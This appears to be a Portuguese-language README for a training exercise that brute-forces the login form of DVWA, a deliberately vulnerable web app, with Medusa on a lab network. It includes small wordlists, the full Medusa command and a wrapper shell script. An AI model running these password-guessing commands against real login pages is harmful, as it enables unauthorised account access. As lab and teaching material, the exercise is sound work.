# medusa-http-bruteforce
Brute-force HTTP form attack using Medusa against DVWA — wordlists, scripts and screenshots.

# Simulating a Brute Force Password Attack with Medusa and Kali Linux

## Resumo
Projeto realizado como entrega do desafio. O objetivo é demonstrar um ataque de força-bruta a um formulário HTTP usando a ferramenta **Medusa** contra uma aplicação vulnerável (ex.: DVWA). O repositório contém as wordlists usadas, o comando/script executado e evidências (capturas de tela).

---

## Estrutura do repositório

medusa-http-bruteforce/
├── README.md
├── users.txt
├── pass.txt
├── comando-medusa.txt # comando usado (texto)
├── script.sh # script executável (opcional, Linux)
└── images/
├── kalih-medusa.png
└── kalih-medusa2.png


---

## Pré-requisitos
- Máquina com Kali Linux (ou outra distro Linux) ou Windows com medusa instalado.
- Medusa instalado (`apt install medusa` em Kali).
- Acesso à máquina alvo (DVWA) na mesma rede (ex.: `192.168.x.x`).

---

## Wordlists
- `users.txt` — lista de nomes de usuário (um por linha).
- `pass.txt` — lista de senhas (um por linha).

Exemplo:

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt


---

## Comando usado
Arquivo: `comando-medusa.txt`

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http
-m FORM:"username=^USER^&password=^PASS^&Login=Login"
-m DENY-SIGNAL:"Login failed" -t 6


**Observações importantes sobre o formato do comando**
- `^USER^` e `^PASS^` são **placeholders do Medusa** — o Medusa substitui esses tokens pelos valores da wordlist.
- O trecho com `&` separa campos do formulário (`username=...&password=...`). Em terminais diferentes, o `&` pode precisar ser protegido/escapado. Veja a seção *Escaping & placeholders* mais abaixo.

---

## Script executável (Linux)
Se desejar automatizar, use `script.sh`:

```bash
#!/bin/bash
# script.sh - Executa Medusa com wordlists em mesma pasta
TARGET="192.168.56.102"
USERS="users.txt"
PASS="pass.txt"

medusa -h "$TARGET" -U "$USERS" -P "$PASS" -M http \
-m FORM:"username=^USER^&password=^PASS^&Login=Login" \
-m DENY-SIGNAL:"Login failed" -t 6

